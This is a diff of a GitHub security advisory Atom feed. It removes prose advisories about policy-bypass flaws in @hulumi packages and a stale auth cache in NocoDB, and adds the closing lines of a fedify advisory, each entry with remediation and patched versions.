+<li><a href="https://github.com/fedify-dev/fedify/security/advisories/GHSA-9rfg-v8g9-9367">https://github.com/fedify-dev/fedify/security/advisories/GHSA-9rfg-v8g9-9367</a></li>
+<li><a href="https://github.com/fedify-dev/fedify/releases/tag/2.2.3">https://github.com/fedify-dev/fedify/releases/tag/2.2.3</a></li>
+<li><a href="https://github.com/advisories/GHSA-9rfg-v8g9-9367">https://github.com/advisories/GHSA-9rfg-v8g9-9367</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-9rfg-v8g9-9367</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-05-26T23:38:37.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[yeoman-environment] yeoman-environment Vulnerable to Arbitrary Package Installation without User Confirmation]]></title>
         <id>https://github.com/advisories/GHSA-vv9j-gjw2-j8wp</id>
@@ -1715,142 +2129,5 @@ console.log(lastSetCookie);
         </author>
         <category label="severity" term="HIGH"/>
         <published>2026-05-21T20:47:44.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[@hulumi/policies] @hulumi/policies: GitHub OIDC trust policy bypass via AWS set-qualified condition operators]]></title>
-        <id>https://github.com/advisories/GHSA-q2f7-m237-v562</id>
-        <link href="https://github.com/advisories/GHSA-q2f7-m237-v562"/>
-        <updated>2026-05-21T20:45:18.000Z</updated>
-        <content type="html"><![CDATA[<p>Impact: @hulumi/policies versions before 1.3.2 only checked exact AWS IAM StringLike/StringEquals condition operator keys in G_OIDC_1. Set-qualified operators such as ForAnyValue:StringLike could hide wildcard GitHub Actions OIDC sub conditions from the mandatory guardrail.</p>
-<p>Patched in 1.3.2: the AWS trust-policy inspector now evaluates set-qualified string operators and rejects unsafe GitHub OIDC sub conditions.</p>
-<p>Remediation: upgrade @hulumi/policies to 1.3.2 or later.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/kerberosmansour/hulumi/security/advisories/GHSA-q2f7-m237-v562">https://github.com/kerberosmansour/hulumi/security/advisories/GHSA-q2f7-m237-v562</a></li>
-<li><a href="https://github.com/advisories/GHSA-q2f7-m237-v562">https://github.com/advisories/GHSA-q2f7-m237-v562</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-q2f7-m237-v562</uri>
-        </author>
-        <category label="severity" term="CRITICAL"/>
-        <published>2026-05-21T20:45:14.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[@hulumi/policies] @hulumi/policies: CIS 1.16 admin policy bypass for inline and attached IAM policies]]></title>
-        <id>https://github.com/advisories/GHSA-4xrh-5m3m-328w</id>
-        <link href="https://github.com/advisories/GHSA-4xrh-5m3m-328w"/>
-        <updated>2026-05-21T20:44:13.000Z</updated>
-        <content type="html"><![CDATA[<p>Impact: @hulumi/policies versions before 1.3.2 did not fully inspect inline and attached IAM policy evidence for the administrator-policy guardrail, so some admin-equivalent policy paths could pass policy evaluation.</p>
-<p>Patched in 1.3.2: the validator inspects the affected policy shapes and includes regression tests.</p>
-<p>Remediation: upgrade @hulumi/policies to 1.3.2 or later.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/kerberosmansour/hulumi/security/advisories/GHSA-4xrh-5m3m-328w">https://github.com/kerberosmansour/hulumi/security/advisories/GHSA-4xrh-5m3m-328w</a></li>
-<li><a href="https://github.com/advisories/GHSA-4xrh-5m3m-328w">https://github.com/advisories/GHSA-4xrh-5m3m-328w</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-4xrh-5m3m-328w</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-05-21T20:44:12.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[@hulumi/policies] @hulumi/policies: HULUMI-H1 SecureBucket parent spoof bypass]]></title>
-        <id>https://github.com/advisories/GHSA-g43v-9x7q-83pq</id>
-        <link href="https://github.com/advisories/GHSA-g43v-9x7q-83pq"/>
-        <updated>2026-05-21T20:43:58.000Z</updated>
-        <content type="html"><![CDATA[<p>Impact: @hulumi/policies versions before 1.3.2 could accept spoofed SecureBucket parent evidence for HULUMI-H1, allowing policy evaluation to miss an unsafe bucket shape.</p>
-<p>Patched in 1.3.2: the validator now correlates evidence to the expected component/resource relationship and includes regression coverage.</p>
-<p>Remediation: upgrade @hulumi/policies to 1.3.2 or later.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/kerberosmansour/hulumi/security/advisories/GHSA-g43v-9x7q-83pq">https://github.com/kerberosmansour/hulumi/security/advisories/GHSA-g43v-9x7q-83pq</a></li>
-<li><a href="https://github.com/advisories/GHSA-g43v-9x7q-83pq">https://github.com/advisories/GHSA-g43v-9x7q-83pq</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-g43v-9x7q-83pq</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-05-21T20:43:58.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[@hulumi/drift] @hulumi/drift: Orphan reconciler accepted externally supplied execute plans]]></title>
-        <id>https://github.com/advisories/GHSA-2ffm-hxrq-qqmm</id>
-        <link href="https://github.com/advisories/GHSA-2ffm-hxrq-qqmm"/>
-        <updated>2026-05-21T20:43:42.000Z</updated>
-        <content type="html"><![CDATA[<p>Impact: @hulumi/drift versions before 1.3.2 could accept externally supplied execute plans without sufficient provenance checks, allowing unsafe reconciliation input to be treated as trusted.</p>
-<p>Patched in 1.3.2: execute-plan handling now validates provenance and rejects untrusted plans, with regression coverage.</p>
-<p>Remediation: upgrade @hulumi/drift to 1.3.2 or later.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/kerberosmansour/hulumi/security/advisories/GHSA-2ffm-hxrq-qqmm">https://github.com/kerberosmansour/hulumi/security/advisories/GHSA-2ffm-hxrq-qqmm</a></li>
-<li><a href="https://github.com/advisories/GHSA-2ffm-hxrq-qqmm">https://github.com/advisories/GHSA-2ffm-hxrq-qqmm</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-2ffm-hxrq-qqmm</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-05-21T20:43:41.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[@hulumi/baseline] @hulumi/baseline: CloudTrail selector tampering events were not fully detected]]></title>
-        <id>https://github.com/advisories/GHSA-gfp8-mp24-5vxg</id>
-        <link href="https://github.com/advisories/GHSA-gfp8-mp24-5vxg"/>
-        <updated>2026-05-21T20:43:28.000Z</updated>
-        <content type="html"><![CDATA[<p>Impact: @hulumi/baseline versions before 1.3.2 could miss some CloudTrail event-selector tampering evidence, reducing coverage for changes to audit logging configuration.</p>
-<p>Patched in 1.3.2: detection coverage and regression tests were expanded.</p>
-<p>Remediation: upgrade @hulumi/baseline to 1.3.2 or later and rerun affected previews/checks.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/kerberosmansour/hulumi/security/advisories/GHSA-gfp8-mp24-5vxg">https://github.com/kerberosmansour/hulumi/security/advisories/GHSA-gfp8-mp24-5vxg</a></li>
-<li><a href="https://github.com/advisories/GHSA-gfp8-mp24-5vxg">https://github.com/advisories/GHSA-gfp8-mp24-5vxg</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-gfp8-mp24-5vxg</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-05-21T20:43:27.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[nocodb] NocoDB: Stale Auth Cache After API Token Deletion]]></title>
-        <id>https://github.com/advisories/GHSA-f76x-f9vj-92jv</id>
-        <link href="https://github.com/advisories/GHSA-f76x-f9vj-92jv"/>
-        <updated>2026-05-21T20:39:54.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>Deleted API tokens continued to authenticate requests until their cache entry expired, because the auth cache was not invalidated by token value at deletion time.</p>
-<h3 id="details">Details</h3>
-<p>The API token deletion path removed the database row but did not evict the token-value keyed entry from the auth cache. The auth middleware therefore continued to accept the deleted token until the cache entry aged out, leaving a deletion-to-revocation window of up to three days.</p>
-<h3 id="impact">Impact</h3>
-<p>Tokens revoked through the UI or API continued to grant access during the cache TTL, breaking the operator's expected security guarantee that deletion is immediate.</p>
-<h3 id="credit">Credit</h3>
-<p>This issue was reported by <a href="https://github.com/bugbunny-research">@bugbunny-research</a>.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/nocodb/nocodb/security/advisories/GHSA-f76x-f9vj-92jv">https://github.com/nocodb/nocodb/security/advisories/GHSA-f76x-f9vj-92jv</a></li>
-<li><a href="https://github.com/advisories/GHSA-f76x-f9vj-92jv">https://github.com/advisories/GHSA-f76x-f9vj-92jv</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-f76x-f9vj-92jv</uri>
-        </author>
-        <category label="severity" term="LOW"/>
-        <published>2026-05-21T20:39:53.000Z</published>
     </entry>
 </feed>
